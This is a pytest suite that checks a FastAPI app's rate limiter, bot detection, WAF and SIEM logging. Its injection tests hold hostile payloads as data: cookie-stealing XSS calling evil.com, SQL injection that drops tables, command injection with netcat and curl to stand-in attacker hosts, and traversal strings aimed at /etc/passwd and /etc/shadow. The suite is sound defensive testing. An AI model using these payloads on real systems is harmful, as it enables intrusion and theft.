"""
Real-world simulation test.

Four scenarios run in sequence using the full middleware stack:

  1. Burst traffic     — 25 clean requests; rate limiter fires after threshold
  2. Bot simulation    — scanner UAs, endpoint scanning, rapid-fire
  3. Injection attacks — XSS, SQLi, CMDi, path traversal
  4. Mixed attacks     — combinations + credential-leak audit

Stability invariants checked after every scenario:
  - No 5xx responses (app never crashes under load)
  - All SIEM stdout lines are valid JSON
  - No raw credential values appear anywhere in log output
"""
import json

import pytest
from fastapi.testclient import TestClient

from app.auth.jwt_handler import create_access_token
from app.main import app

# Unique IPs per scenario — prevents Redis state leaking between tests.
_IP_BURST     = "10.20.1.1"
_IP_BOT       = "10.20.2.1"
_IP_INJECT    = "10.20.3.1"
_IP_MIXED     = "10.20.4.1"
_IP_LOG_AUDIT = "10.20.5.1"

# Recognisable sentinel value sent as X-API-Key to verify it never surfaces in logs.
_CANARY_KEY = "canary-api-key-must-never-appear-in-logs-deadbeef1234567890abcdef"


# ---------------------------------------------------------------------------
# Shared fixtures
# ---------------------------------------------------------------------------

@pytest.fixture(scope="module")
def tc():
    with TestClient(app, raise_server_exceptions=True) as c:
        yield c


def _bearer(subject: str = "sim-user", role: str = "VIEWER") -> str:
    return create_access_token(subject, role, tenant_id="default")


def _headers(subject: str = "sim-user", ip: str = _IP_BURST, ua: str = "pytest-sim/1.0") -> dict:
    return {
        "Authorization": f"Bearer {_bearer(subject)}",
        "User-Agent": ua,
        "X-Forwarded-For": ip,
    }


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

def _assert_no_5xx(statuses: list[int], label: str) -> None:
    errors = [s for s in statuses if s >= 500]
    assert not errors, f"[{label}] {len(errors)} 5xx response(s): {set(errors)}"


def _assert_siem_clean(raw_out: str, label: str, sensitive: list[str] | None = None) -> None:
    """Validate every JSON line in stdout; optionally assert no sensitive values present."""
    parse_errors: list[str] = []
    schema_errors: list[str] = []

    for lineno, line in enumerate(raw_out.splitlines(), 1):
        line = line.strip()
        if not line or not line.startswith("{"):
            continue
        try:
            event = json.loads(line)
        except json.JSONDecodeError as exc:
            parse_errors.append(f"line {lineno}: {exc} — {line[:120]}")
            continue
        # SIEM events must carry action + timestamp
        if "event_type" in event:
            for field in ("action", "timestamp"):
                if field not in event:
                    schema_errors.append(f"line {lineno}: missing '{field}'")

    if parse_errors:
        pytest.fail(f"[{label}] SIEM JSON parse failures:\n" + "\n".join(parse_errors))
    if schema_errors:
        pytest.fail(f"[{label}] SIEM schema failures:\n" + "\n".join(schema_errors))

    for secret in (sensitive or []):
        assert secret not in raw_out, (
            f"[{label}] Credential leaked into log output: {secret[:16]}…"
        )


# ---------------------------------------------------------------------------
# 1. Burst traffic
# ---------------------------------------------------------------------------

class TestBurstTraffic:
    """
    25 clean requests from one IP through the full stack.
    Rate limiter (threshold=20) must fire without crashing the app.
    """

    # RATE_LIMIT=20 from conftest; THROTTLE_MAX_HITS default=5.
    # Hard 429 fires once throttle counter > THROTTLE_MAX_HITS, i.e. on the
    # (RATE_LIMIT + THROTTLE_MAX_HITS + 1)th = 26th request.  Send 30 to be safe.
    BURST_N         = 30
    THRESHOLD       = 20   # matches conftest RATE_LIMIT_REQUESTS=20
    THROTTLE_MAX    = 5    # matches THROTTLE_MAX_HITS default

    def test_burst_stability_and_rate_limiting(self, tc, capsys):
        statuses = []
        for _ in range(self.BURST_N):
            resp = tc.get("/probe", headers=_headers(ip=_IP_BURST))
            statuses.append(resp.status_code)

        allowed = [s for s in statuses if s in (200, 404)]
        limited = [s for s in statuses if s == 429]
        # throttle = requests that exceeded rate limit but haven't yet hit the hard cap
        throttle_passed = [
            s for i, s in enumerate(statuses)
            if s in (200, 404) and i >= self.THRESHOLD
        ]

        _assert_no_5xx(statuses, "burst")
        assert len(allowed) >= self.THRESHOLD, (
            f"Expected ≥{self.THRESHOLD} allowed requests before throttle, got {len(allowed)}"
        )
        # Soft throttle window (requests THRESHOLD+1 … THRESHOLD+THROTTLE_MAX_HITS)
        assert len(throttle_passed) >= 1, (
            "Expected some requests to pass through during throttle window"
        )
        # Hard 429 kicks in after THROTTLE_MAX_HITS throttle hits
        assert len(limited) >= 1, (
            f"Expected ≥1 hard 429 after {self.THRESHOLD + self.THROTTLE_MAX} requests; "
            f"statuses: {statuses}"
        )

        raw = capsys.readouterr().out
        _assert_siem_clean(raw, "burst")


# ---------------------------------------------------------------------------
# 2. Bot simulation
# ---------------------------------------------------------------------------

class TestBotSimulation:
    """
    Scanner UAs and endpoint enumeration.  Bot detection does not block
    on a single request (score accumulates over a window), so the core
    assertions are: no crashes, valid logs, and responses in the expected
    HTTP range.
    """

    SCANNER_UAS = [
        "sqlmap/1.7.8",
        "nikto/2.1.6",
        "masscan/1.3",
        "zgrab/0.x",
        "",   # missing UA — suspicious
    ]

    SCAN_PATHS = [
        "/admin", "/wp-login.php", "/.env", "/config.php",
        "/api/users", "/api/v1/auth", "/phpmyadmin",
        "/api/v2/secrets", "/backup.sql", "/.git/config",
    ]

    def test_scanner_ua_no_crash(self, tc, capsys):
        statuses = []
        for ua in self.SCANNER_UAS:
            resp = tc.get("/probe", headers=_headers(ip=_IP_BOT, ua=ua))
            statuses.append(resp.status_code)

        _assert_no_5xx(statuses, "bot-ua")
        _assert_siem_clean(capsys.readouterr().out, "bot-ua")

    def test_endpoint_scanning_no_crash(self, tc, capsys):
        statuses = []
        for path in self.SCAN_PATHS:
            resp = tc.get(path, headers=_headers(ip=_IP_BOT, ua="masscan/1.3"))
            statuses.append(resp.status_code)
            assert resp.status_code < 500, f"Scan of {path!r} caused 5xx"

        _assert_no_5xx(statuses, "endpoint-scan")
        _assert_siem_clean(capsys.readouterr().out, "endpoint-scan")

    def test_rapid_fire_same_endpoint(self, tc, capsys):
        """20 back-to-back requests from a single bot IP — no crashes, no 5xx."""
        statuses = [
            tc.get("/probe", headers=_headers(ip=_IP_BOT, ua="sqlmap/1.7.8")).status_code
            for _ in range(20)
        ]
        _assert_no_5xx(statuses, "rapid-fire")
        _assert_siem_clean(capsys.readouterr().out, "rapid-fire")


# ---------------------------------------------------------------------------
# 3. Injection attacks
# ---------------------------------------------------------------------------

class TestInjectionAttacks:
    """
    WAF must block (403) every payload category; app must never 5xx.
    """

    def _post(self, tc, payload: dict) -> object:
        headers = {
            **_headers(subject="attacker", ip=_IP_INJECT),
            "Content-Type": "application/json",
        }
        return tc.post("/api/data", headers=headers, content=json.dumps(payload))

    # --- XSS ---

    @pytest.mark.parametrize("payload", [
        {"comment": "<script>alert(document.cookie)</script>"},
        {"name": "user\" onerror=alert(1)"},
        {"body": "<img src=x onerror=fetch('//evil.com/'+document.cookie)>"},
        {"data": "javascript:alert(document.domain)"},
    ])
    def test_xss_blocked(self, tc, payload, capsys):
        resp = self._post(tc, payload)
        assert resp.status_code == 403, (
            f"XSS not blocked: {list(payload.values())[0]!r} → {resp.status_code}"
        )
        _assert_siem_clean(capsys.readouterr().out, "xss")

    # --- SQLi ---

    @pytest.mark.parametrize("payload", [
        {"search": "1 UNION SELECT username,password FROM users--"},
        {"id": "'; DROP TABLE users; --"},
        {"q": "1 OR 1=1 --"},
        {"user": "admin' AND SLEEP(5)--"},
        {"filter": "1; SELECT * FROM information_schema.tables--"},
    ])
    def test_sqli_blocked(self, tc, payload, capsys):
        resp = self._post(tc, payload)
        assert resp.status_code == 403, (
            f"SQLi not blocked: {list(payload.values())[0]!r} → {resp.status_code}"
        )
        _assert_siem_clean(capsys.readouterr().out, "sqli")

    # --- CMDi ---

    @pytest.mark.parametrize("payload", [
        {"cmd": "ls; cat /etc/passwd"},
        {"input": "test | nc attacker.com 4444"},
        {"file": "$(curl evil.com/exfil)"},
        {"arg": "`whoami`"},
    ])
    def test_cmdi_blocked(self, tc, payload, capsys):
        resp = self._post(tc, payload)
        assert resp.status_code == 403, (
            f"CMDi not blocked: {list(payload.values())[0]!r} → {resp.status_code}"
        )
        _assert_siem_clean(capsys.readouterr().out, "cmdi")

    # --- Path traversal ---

    @pytest.mark.parametrize("path", [
        "/api/data?file=../../../../etc/passwd",
        "/api/data?path=../../../etc/shadow",
        "/api/data?include=....//....//etc/passwd",
        "/api/data?doc=..%2F..%2F..%2Fetc%2Fpasswd",
    ])
    def test_path_traversal_blocked(self, tc, path, capsys):
        resp = tc.get(path, headers=_headers(subject="attacker", ip=_IP_INJECT))
        assert resp.status_code == 403, f"Path traversal not blocked: {path!r}"
        _assert_siem_clean(capsys.readouterr().out, "path-traversal")


# ---------------------------------------------------------------------------
# 4. Mixed attacks
# ---------------------------------------------------------------------------

class TestMixedAttacks:
    """
    Combinations: bot UA + injection, auth-failure flood, polyglot payloads,
    and a credential-leak audit of the SIEM output.
    """

    def test_bot_ua_with_sqli(self, tc, capsys):
        """SQLi from a scanner UA — injection detection must block (403)."""
        headers = {
            **_headers(subject="mixed-attacker", ip=_IP_MIXED, ua="sqlmap/1.7.8"),
            "Content-Type": "application/json",
        }
        resp = tc.post(
            "/api/data", headers=headers,
            content=json.dumps({"q": "1 UNION SELECT * FROM users--"}),
        )
        assert resp.status_code == 403
        assert resp.status_code < 500
        _assert_siem_clean(capsys.readouterr().out, "bot+sqli")

    def test_polyglot_sqli_xss(self, tc, capsys):
        """Payload combining SQLi + XSS — caught by injection detection."""
        headers = {
            **_headers(subject="mixed-attacker", ip=_IP_MIXED),
            "Content-Type": "application/json",
        }
        resp = tc.post(
            "/api/data", headers=headers,
            content=json.dumps({"q": "1' OR '1'='1; <script>alert(1)</script>-- -"}),
        )
        assert resp.status_code == 403
        _assert_siem_clean(capsys.readouterr().out, "polyglot")

    def test_auth_failure_flood_no_crash(self, tc, capsys):
        """10 bad credentials from different IPs — must never 5xx."""
        statuses = []
        for i in range(10):
            resp = tc.get("/probe", headers={
                "Authorization": "Bearer not.a.real.token",
                "User-Agent": "pytest-sim/1.0",
                "X-Forwarded-For": f"10.99.{i}.1",
            })
            statuses.append(resp.status_code)
            assert resp.status_code in (401, 403), (
                f"Invalid token should yield 401/403, got {resp.status_code}"
            )
        _assert_no_5xx(statuses, "auth-flood")
        _assert_siem_clean(capsys.readouterr().out, "auth-flood")

    def test_no_credential_in_logs(self, tc, capsys):
        """
        Raw JWT and API key values must never appear anywhere in SIEM output.

        Sends both a real JWT and a recognisable canary API key, then asserts
        neither value surfaces in the captured stdout.
        """
        token_value = _bearer("log-audit-user")
        resp = tc.get("/probe", headers={
            "Authorization": f"Bearer {token_value}",
            "X-API-Key": _CANARY_KEY,
            "User-Agent": "pytest-sim/1.0",
            "X-Forwarded-For": _IP_LOG_AUDIT,
        })
        assert resp.status_code < 500

        raw_out = capsys.readouterr().out
        _assert_siem_clean(
            raw_out, "cred-leak",
            sensitive=[token_value, _CANARY_KEY],
        )
